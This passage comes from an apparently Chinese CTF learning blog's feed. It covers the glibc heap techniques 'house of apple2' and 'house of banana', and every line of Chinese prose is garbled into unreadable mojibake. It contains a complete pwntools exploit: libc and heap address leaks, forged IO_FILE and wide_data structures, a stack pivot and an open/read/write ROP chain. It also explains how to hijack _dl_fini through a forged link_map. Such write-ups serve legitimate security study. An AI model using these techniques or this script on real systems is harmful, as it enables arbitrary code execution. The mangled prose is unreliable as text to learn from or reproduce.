çš„ç¬¬äºŒä¸ªä¼ªé€ çš„ <code>IO_FILE</code></p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022316010.png" alt="image-20230202231655803" style="zoom:50%;" /><p>ä¸‹é¢è¿™ä¸ªæ˜¯ä¼ªé€ çš„ <code>_IO_wide_data</code> ç»“æ„ä½“ï¼Œå› ä¸ºå †å—å¾ˆå¤§ï¼Œæ‰€ä»¥æ”¾å¿ƒå¸ƒç½®å³å¯</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022318082.png" alt="image-20230202231820885" style="zoom:50%;" /><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022318642.png" alt="image-20230202231830333"></p><p>å¦‚æœè¦è·å– <code>shell</code> çš„è¯ï¼Œé‚£æ§åˆ¶ <code>IO_FILE</code> çš„ <code>_flags</code> å­—æ®µä¸ºå‚æ•°ï¼Œ <code>_wide_vtable</code> ä¸­çš„ <code>overflow</code> æ”¹æˆ <code>system</code> åœ°å€å³å¯è·å–  <code>shell</code>ã€‚</p><h6 id="æ ˆè¿ç§»-amp-amp-rop"><a href="#æ ˆè¿ç§»-amp-amp-rop" class="headerlink" title="æ ˆè¿ç§»&amp;&amp;rop"></a>æ ˆè¿ç§»&amp;&amp;rop</h6><p>ä½†æ˜¯æ‰“ <code>orw</code> çš„è¯è¦ç•¥å¾®éº»çƒ¦ä¸€ç‚¹ï¼Œæˆ‘è¿™é‡Œæ˜¯é‡‡ç”¨äº† <code>winmt</code> å¸ˆå‚…æåˆ°çš„ä¸€ä¸ª <a href="https://bbs.kanxue.com/thread-272098.htm">æ–¹æ³•</a>ï¼Œåˆ©ç”¨ä¸‹é¢è¿™æ®µ <code>gadget</code> æ‰“äº†ä¸€ä¸ªæ ˆè¿ç§»ï¼Œå› ä¸º <code>rdi+0x48</code> å¯æ§ï¼ˆ<code>rdi</code> å°±æ˜¯ <code>IO_FILE</code> çš„é¦–åœ°å€ï¼‰ï¼Œæ‰€ä»¥ <code>rbp</code> å¯æ§ï¼Œæ‰€ä»¥ <code>rax</code> å¯æ§ï¼Œæ‰€ä»¥ <code> call   QWORD PTR [rax+0x28]</code> å¯ä»¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµï¼Œè¿™é‡Œçš„æ‰§è¡Œæµå»è°ƒç”¨ <code>leave ; ret</code> è¿›è¡Œä¸€ä¸ªæ ˆè¿ç§»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svcudp_reply+26&gt;:    mov    rbp,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;svcudp_reply+30&gt;:    mov    rax,QWORD PTR [rbp+0x18]</span><br><span class="line">&lt;svcudp_reply+34&gt;:    lea    r13,[rbp+0x10]</span><br><span class="line">&lt;svcudp_reply+38&gt;:    mov    DWORD PTR [rbp+0x10],0x0</span><br><span class="line">&lt;svcudp_reply+45&gt;:    mov    rdi,r13</span><br><span class="line">&lt;svcudp_reply+48&gt;:    call   QWORD PTR [rax+0x28]</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯æ­£åœ¨æ‰§è¡Œè¿™æ®µ <code>gadget</code> çš„æƒ…å†µ</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022329670.png" alt="image-20230202232950364" style="zoom:50%;" /><p>ä¸‹å›¾ä¸ºæ ˆè¿ç§»åçš„æƒ…å†µï¼Œæ¥ä¸‹æ¥è§¦å‘ <code>rop</code> é“¾</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022330494.png" alt="image-20230202233043116" style="zoom:50%;" /><p>æœ€å <code>orw</code> çš„ <code>rop</code> é“¾å¦‚ä¸‹ï¼Œæ­¤æ—¶å°†è¦å¼€å§‹æ‰§è¡Œ</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022332120.png" alt="image-20230202233224913" style="zoom:50%;" /><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><p><a href="https://zikh26.github.io/posts/ad411136.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">d_a=<span class="number">0x13B9</span></span><br><span class="line">d_d=<span class="number">0x13C3</span></span><br><span class="line">d_r=<span class="number">0x13E0</span></span><br><span class="line">d_w=<span class="number">0x13FD</span> </span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">choice</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choise: &quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: \n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_data</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Message: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_data</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">p.sendlineafter(<span class="string">&quot;enter your key &gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">write_data(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Message: \n&quot;</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219ce0</span></span><br><span class="line">p.recv(<span class="number">2</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x13c0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps=libc_base+<span class="number">0x2160c0</span></span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret=libc_base+<span class="number">0x00000000000562ec</span></span><br><span class="line">magic_gadget=libc_base+<span class="number">0x16a1fa</span></span><br><span class="line">pop_rsp_ret=<span class="number">0x0000000000035732</span>+libc_base</span><br><span class="line">pop_rdi_ret=libc_base+<span class="number">0x000000000002a3e5</span></span><br><span class="line">add_rsp_ret=<span class="number">0x000000000003a889</span>+libc_base</span><br><span class="line">pop_rsi_ret=libc_base+<span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_r12_ret=libc_base+<span class="number">0x000000000011f497</span></span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr=libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rax_ret=libc_base+<span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall=libc_base+<span class="number">0xea5b9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">rop=p64(pop_rdi_ret)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0x518</span>)<span class="comment"># &#x27;flag&#x27; address</span></span><br><span class="line">rop+=p64(pop_rsi_ret)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(pop_rax_ret)</span><br><span class="line">rop+=p64(<span class="number">2</span>)</span><br><span class="line">rop+=p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">rop+=p64(pop_rdi_ret)</span><br><span class="line">rop+=p64(<span class="number">3</span>)</span><br><span class="line">rop+=p64(pop_rsi_ret)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0xb40</span>)<span class="comment"># flag store address</span></span><br><span class="line">rop+=p64(pop_rdx_r12_ret)</span><br><span class="line">rop+=p64(<span class="number">0x50</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(read_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">rop+=p64(pop_rdi_ret)</span><br><span class="line">rop+=p64(<span class="number">1</span>)</span><br><span class="line">rop+=p64(pop_rsi_ret)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0xb40</span>)<span class="comment"># flag store address</span></span><br><span class="line">rop+=p64(pop_rdx_r12_ret)</span><br><span class="line">rop+=p64(<span class="number">0x50</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(write_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wide_data=p64(<span class="number">0</span>)*<span class="number">21</span></span><br><span class="line">wide_data+=p64(leave_ret)<span class="comment">#second call</span></span><br><span class="line">wide_data+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">wide_data+=<span class="string">b&quot;./flag\x00\x00&quot;</span></span><br><span class="line">wide_data+=p64(add_rsp_ret)<span class="comment">#ç¬¬äºŒæ¬¡æ ˆè¿ç§»  åŸå› æ˜¯ropé“¾ä¸èƒ½ç ´åä¸‹é¢çš„magic_gadget</span></span><br><span class="line">wide_data+=p64(<span class="number">0</span>)</span><br><span class="line">wide_data+=p64(heap_base+<span class="number">0x450</span>-<span class="number">0x68</span>+(<span class="number">8</span>*<span class="number">29</span>))</span><br><span class="line">wide_data+=p64(magic_gadget)<span class="comment">#first call</span></span><br><span class="line">wide_data+=rop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io_file=p64(~(<span class="number">2</span> | <span class="number">0x8</span> | <span class="number">0x800</span>)+(<span class="number">1</span>&lt;&lt;<span class="number">64</span>))<span class="comment">#_flags</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#write_base &amp;&amp; write_ptr</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">io_file+=p64(heap_base+<span class="number">0x538</span>-<span class="number">0x20</span>)<span class="comment">#rbp  [rdi+0x48]</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">io_file+=p64(heap_base+<span class="number">0x450</span>)<span class="comment">#wide_data</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io_file+=p64(_IO_wfile_jumps)</span><br><span class="line"></span><br><span class="line">payload=p64(libc_base+<span class="number">0x21a1f0</span>)*<span class="number">2</span>+p64(io_list_all)+p64(io_list_all-<span class="number">0x20</span>)<span class="comment">#io_write_baseæ§åˆ¶ä¸ºio_list_all å› ä¸ºéœ€è¦å¤§äºio_write_pträ¸è§¦å‘overflow</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(heap_base+<span class="number">0x370</span>)<span class="comment">#chain    æŒ‡å‘äº†ç¬¬ä¸€ä¸ªä¼ªé€ çš„ç»“æ„ä½“çš„vtable</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">14</span></span><br><span class="line">payload+=io_file</span><br><span class="line">payload+=wide_data</span><br><span class="line"></span><br><span class="line">read_data(<span class="number">0</span>,payload.ljust(<span class="number">0x880</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_w,d_r,<span class="number">0x12BC</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022334166.png" alt="image-20230202233408774"></p><h4 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h4><p>é¦–å…ˆæ„Ÿè°¢ <strong>roderick</strong> å¸ˆå‚…åˆ†äº«è¿™ç§æ”»å‡»æ–¹æ³•ï¼Œ<code>house of apple2</code> æ‰€éœ€çš„æ¡ä»¶è¾ƒå°‘ï¼Œæ˜¯ä¸€ç§å¾ˆä¼˜ç§€çš„æ”»å‡»æ–¹æ³•ã€‚</p><p>åœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­ï¼Œå°½é‡å¤šç¿»çœ‹æºç ï¼Œæ‹æ¸…å‡½æ•°çš„æ‰§è¡Œæµï¼Œæ¸…æ¥šéœ€è¦ç»•è¿‡çš„æ£€æŸ¥ä»¥åŠæ‰€ä¼ªé€ çš„å­—æ®µã€‚åœ¨å®é™…çš„é¢˜ç›®ä¸­ï¼Œéœ€è¦ç»å¸¸ä½¿ç”¨ <code>gdb</code> è°ƒè¯•æ¥è¾¹è°ƒè¾¹å¸ƒå±€ç»“æ„ä½“ä¸­çš„æ•°æ®ï¼Œè‡ªå·±è¿›å…¥è°ƒè¯•é‚£ç§çŠ¶æ€å¾ˆç¾å¦™ï¼Œä¼¼ä¹åªæœ‰è‡ªå·±çŸ¥é“è‡ªå·±åœ¨åšä»€ä¹ˆï¼Œé€šè¿‡è°ƒè¯•æ¥é¢„æµ‹ä»¥åŠéªŒè¯æ¥ä¸‹æ¥ç¨‹åºçš„å˜åŒ–æ˜¯å¾ˆäº«å—çš„ä¸€ä»¶äº‹æƒ…ï¼ˆå°½ç®¡é‡å¤çš„æ•²å‡»é‚£å‡ ä¸ªæŒ‰é”®ï¼Œæ‰‹ä¼šæ¯”è¾ƒé…¸ -&gt;.-&gt; ï¼‰ï¼Œè¿™ç§ä¸œè¥¿åªå¯æ„ä¼šä¸å¯è¨€ä¼ ã€‚</p><p>å¤šåŠ¨æ‰‹ï¼Œå¤šæ€è€ƒå°±ä¼šç¦»çœŸç›¸æ›´è¿‘ä¸€æ­¥ã€‚</p><h3 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h3><p><a href="https://bbs.kanxue.com/thread-273418.htm">https://bbs.kanxue.com/thread-273418.htm</a></p><p><a href="https://www.roderickchan.cn/post/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">House of Apple ä¸€ç§æ–°çš„glibcä¸­IOæ”»å‡»æ–¹æ³• (2) - roderick - record and learn! (roderickchan.cn)</a></p><p><a href="https://bbs.kanxue.com/thread-272098.htm">https://bbs.kanxue.com/thread-272098.htm</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FSOP </tag>
            
            <tag> ä¼ªé€ IO_FILE </tag>
            
            <tag> orw </tag>
            
            <tag> large bin attack </tag>
            
            <tag> house of apple </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºhouse of bananaçš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/efb4678.html"/>
      <url>/posts/efb4678.html</url>
      
        <content type="html"><![CDATA[<h2 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h2><blockquote><p>æ”»å‡»æ•ˆæœï¼š</p><p>æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµ</p><p>é€‚ç”¨ç‰ˆæœ¬ï¼š<code>glibc2.23</code> åˆ°ç›®å‰æœ€æ–°çš„ <code>2.36</code></p><p>æ³¨æ„ï¼š ä½¿ç”¨ <code>setcontext</code> æ¥æ§åˆ¶å¯„å­˜å™¨æ‰“ <code>orw</code> çš„è¯ï¼Œéœ€è¦åœ¨ <code>2.29</code> ç‰ˆæœ¬ä»¥ä¸Šæ‰è¡Œï¼ˆ <code>2.27</code> æ²¡æœ‰åŠæ³•è®© <code>rdx</code> æˆ– <code>rdi</code> ä¸ºå †åœ°å€ï¼‰</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ol><li>å¯ä»¥ä»»æ„åœ°å€å†™ä¸€ä¸ªå †åœ°å€ï¼ˆé€šå¸¸ä½¿ç”¨ <code>large bin attack</code>ï¼‰</li><li>èƒ½å¤Ÿä» <code>main</code> å‡½æ•°è¿”å›æˆ–è€…è°ƒç”¨ <code>exit</code> å‡½æ•°</li><li>å¯ä»¥æ³„éœ² <code>libc</code> åœ°å€å’Œå †åœ°å€</li></ol></blockquote><h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p><code>link_map</code> ç»“æ„ä½“çš„å­˜å‚¨æ–¹å¼å’Œå †å—é“¾è¡¨ç±»ä¼¼ï¼Œæ˜¯é€šè¿‡ <code>l_next</code> å’Œ <code>l_prev</code> æŒ‡é’ˆæ¥è¿æ¥çš„,è€Œè¿™ä¸ªé“¾è¡¨çš„å¤´æŒ‡é’ˆå°±æ˜¯ <code>_rtld_global</code> ç»“æ„ä½“ä¸­çš„ <code>_ns_loaded</code> æ‰€å­˜å‚¨çš„åœ°å€ã€‚</p><p> å¦‚æœæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>large bin attack</code> æˆ–å…¶ä»–æ–¹å¼å°†é“¾è¡¨çš„å¤´æŒ‡é’ˆæ”¹ä¸ºå¯æ§å †åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥ä¼ªé€ ç¬¬ä¸€ä¸ª <code>link_map</code> ç»“æ„ä½“ï¼Œä»è€Œæ§åˆ¶ç»“æ„ä½“ä¸­çš„å„ä¸ªå­—æ®µï¼Œä¸‹é¢ä»£ç æ˜¯ <code>_dl_fini</code> å‡½æ•°ä¸­çš„ç‰‡æ®µ</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172126686.png" alt="image-20230217212607337" style="zoom:50%;" /><p>è“è‰²æ¡†ä¸­æ˜¯è¦ç»•è¿‡ <code>if</code> æ£€æŸ¥æ‰€éœ€è¦ä¼ªé€ çš„å­—æ®µï¼Œçº¢è‰²æ¡†ä¸­æ˜¯åŠ«æŒæ‰§è¡Œæµçš„ä½ç½®ã€‚</p><p>æœ€ç»ˆçš„ç›®çš„æ˜¯éœ€è¦ä¼ªé€ ä¸€äº›å­—æ®µç»•è¿‡æ£€æŸ¥å¹¶å¸ƒå±€ä¸€äº›å­—æ®µä¸ºåŠ«æŒæ‰§è¡Œæµåšå‡†å¤‡ï¼Œæœ€ç»ˆæ‰§è¡Œåˆ° <code>array[i]</code> æ—¶è¿›è¡ŒåŠ«æŒã€‚</p><h3 id="åˆ©ç”¨è¿‡ç¨‹"><a href="#åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="åˆ©ç”¨è¿‡ç¨‹"></a>åˆ©ç”¨è¿‡ç¨‹</h3><p>é¦–å…ˆéœ€è¦æ¢å¤<code>l_next</code> å­—æ®µåŸæœ¬çš„å€¼ï¼Œè¿™æ ·ä¹‹åçš„ <code>link_map</code> å°±ä¸ç”¨å†ä¼ªé€ äº†ã€‚</p><p>å°† <code>l_real</code> å­—æ®µæ”¹ä¸ºä¼ªé€ çš„ <code>link_map</code> åœ°å€ï¼Œä»¥ä¾¿æ»¡è¶³ <code>if (l == l-&gt;l_real)</code> ï¼Œç¡®ä¿ä¸ä¼šè§¦å‘ <code>assert</code></p><p>å°† <code>l_info[26]</code> çš„å€¼è®¾ç½®ä¸ºéç©ºï¼Œä¸ºäº†æ»¡è¶³ <code>if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</code></p><p>å¦‚æœæ»¡è¶³è¿™ä¸‰ä¸ªæ¡ä»¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¯¹ <code>array</code> çš„åœ°å€è¿›è¡Œè®¾ç½®ï¼Œå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br></pre></td></tr></table></figure><p>ä¸ºäº†æ›´ç²¾å‡†çš„æ§åˆ¶ <code>array</code> ï¼Œæˆ‘ä»¬æ§åˆ¶ <code>l_addr</code> ä¸º <code>0</code> ï¼ˆäº‹å®ä¸Šè¿™ä¸ªå€¼é€šå¸¸ä¹Ÿæ²¡æœ‰åŠæ³•è¢«æ§åˆ¶ï¼Œå› ä¸ºè¿™ä¸ª <code>l_addr</code> æ˜¯å †å—çš„ <code>prev_size</code>  å­—æ®µï¼Œæ­£å¸¸æƒ…å†µå°±æ˜¯ <code>0</code>ï¼‰</p><p>è€Œ <code>DT_FINI_ARRAY</code> è¿™ä¸ªå®å°±æ˜¯ <code>26</code> ï¼Œ<code>d_un</code> åˆ™æ˜¯ä¸€ä¸ªè”åˆä½“ï¼Œå®šä¹‰å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    Elf32_Word d_val;<span class="comment">/* Integer value */</span></span><br><span class="line">    Elf32_Addr d_ptr;<span class="comment">/* Address value */</span></span><br><span class="line">  &#125; d_un;</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬å°† <code>l-&gt;l_info[26]</code> çš„å€¼è®¾ç½®ä¸º <code>l-&gt;l_info[26]</code> çš„åœ°å€ï¼Œé‚£ä¹ˆ <code>l-&gt;l_info[27]</code> ä¸­çš„å€¼åˆ™æ˜¯ <code>array</code> </p><p><strong>æ³¨æ„ï¼š</strong>  <code>-&gt;</code> æ“ä½œç¬¦åœ¨ <code>C</code> è¯­è¨€è¢«å®šä¹‰ä¸ºç»“æ„ä½“æŒ‡é’ˆæˆå‘˜çš„è§£å¼•ç”¨å’Œæˆå‘˜è®¿é—®æ“ä½œç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´è¯¥æ“ä½œç¬¦å®Œæˆäº†ä¸¤ä¸ªæ“ä½œï¼Œå…ˆå¯¹æŒ‡é’ˆè¿›è¡Œäº†è§£å¼•ç”¨ï¼Œç„¶åå†è®¿é—®æŒ‡é’ˆæ‰€æŒ‡å‘çš„ç»“æ„ä½“æˆå‘˜ã€‚å› æ­¤ä¸Šé¢çš„ä»£ç  <code>l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code> è¿›è¡Œäº†ä¸¤æ¬¡è§£å¼•ç”¨æœ€åå°†å€¼èµ‹ç»™ <code>array</code> ï¼Œè€Œ <strong>winmt</strong> å¸ˆå‚…åœ¨ <a href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31">æ–‡ç« </a> ä¸­å†™åˆ° <strong>â€œä»¥åŠl-&gt;l_info[26]-&gt;d_un.d_ptrï¼Œä¹Ÿå°±æ˜¯l-&gt;l_info[27]â€</strong> ï¼Œè¿™å¥è¯æœ‰ç‚¹å°é—®é¢˜ï¼Œå› ä¸ºç†è§£ä¸º <code>l-&gt;l_info[27]</code> çš„è¯ï¼Œåªè¿›è¡Œäº†ä¸€æ¬¡è§£å¼•ç”¨ï¼Œæ‰€ä»¥è¿™é‡Œæ›¿ <strong>winmt</strong> å¸ˆå‚…çº æ­£ä¸‹ QAQ</p><p>æ¥ä¸‹æ¥æ§åˆ¶ <code>i</code> çš„å€¼ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br></pre></td></tr></table></figure><p><code>DT_FINI_ARRAYSZ</code> è¿™ä¸ªå®æ˜¯ <code>28</code> ï¼Œæ‰€ä»¥å°† <code>l-&gt;l_info[28]</code> çš„å€¼è®¾ç½®ä¸º <code>l-&gt;l_info[28]</code> çš„åœ°å€ï¼Œé‚£ä¹ˆ <code>l-&gt;l_info[29]</code> ä¸­çš„å€¼å†é™¤ <code>8</code> ï¼Œåˆ™æ˜¯æœ€åçš„ <code>i</code></p><p>æœ€åçš„åŠ«æŒä½ç½®æ˜¯å‡½æ•°æŒ‡é’ˆ <code>array[i]</code> è¢«è°ƒç”¨ï¼Œå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br></pre></td></tr></table></figure><p>ä¸Šé¢å·²ç»æåˆ°äº† <code>array</code> å’Œ <code>i</code> éƒ½å¯ä»¥è¢«æ§åˆ¶ï¼Œå› æ­¤è¿™é‡Œå¯ä»¥æ‰§è¡Œä»£ç ï¼Œå¦‚æœæ‰“ <code>one_gadget</code> è·å– <code>shell</code> çš„è¯ï¼Œç›´æ¥å¸ƒç½®åœ°å€å³å¯ï¼Œä½†æ˜¯æ‰§è¡Œ <code>orw</code> çš„è¯ï¼Œéœ€è¦å…ˆç©ºèµ°ä¸€è½®å‡½æ•°è°ƒç”¨ï¼Œå› ä¸º <code>rdx</code> å†æ¯è½®å¾ªç¯åï¼Œéƒ½ä¼šè¢«æ›´æ–°ä¸ºå †åœ°å€ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172126762.png" alt="image-20230217203244752" style="zoom:50%;" /><p>èµ°ç©ºä¸€è½®çš„æ„æ€å°±æ˜¯è·³è½¬åˆ° <code>ret</code> æŒ‡ä»¤ä¸Šï¼Œç„¶åç«‹åˆ»é€€å‡ºè¿™ä¸€è½®çš„å‡½æ•°æŒ‡é’ˆè°ƒç”¨ï¼Œ<code>i--</code> ç„¶åè°ƒç”¨ä¸‹ä¸€ä¸ª <code>array[i]</code> ä¸­å­˜æ”¾çš„å‡½æ•°æŒ‡é’ˆï¼Œæ­¤æ—¶çš„ <code>rdx</code> å·²ç»ä¸ºå †åœ°å€äº†ï¼Œæ‰€ä»¥æ­¤æ—¶å»è·³è½¬åˆ° <code>setcontext+61</code>  çš„ä½ç½®ï¼Œå¸ƒç½® <code>SROP</code> ï¼Œè°ƒç”¨ <code>read</code> å‡½æ•°å†æ¬¡è¯»å…¥ <code>orw</code> çš„ <code>rop</code> é“¾ä½¿å…¶æ­£å¥½è½åˆ° <code>read</code> å‡½æ•°çš„è¿”å›åœ°å€ä¸Šï¼Œä»è€Œç»•è¿‡æ²™ç®±ä¿æŠ¤ã€‚</p><p><strong>è¡¥å……ï¼š</strong></p><p><code>2.27</code> çš„ <code>libc</code> ä¸­æ²¡åŠæ³•æ§åˆ¶å¯„å­˜å™¨èµ° <code>setcontext</code> ï¼Œå› ä¸ºå…¶æ±‡ç¼–å¦‚ä¸‹</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172129364.png" alt="image-20230217212955875" style="zoom:50%;" /><p>å¯¹æ¯”ä¸‹é¢è¿™ä¸ªå›¾ç‰‡ï¼ˆ <code>2.31</code> çš„ <code>libc</code>ï¼‰ï¼Œå°±ä¼šå‘ç° <code>2.27</code> æ²¡æœ‰ <code>rdi</code> æˆ–è€… <code>rdx</code> è¢«èµ‹å€¼ä¸ºå †åœ°å€çš„æŒ‡ä»¤,æ‰€ä»¥ä¸å¥½æ‰“ <code>orw</code></p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172131373.png" alt="image-20230217213154837" style="zoom: 50%;" /><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure 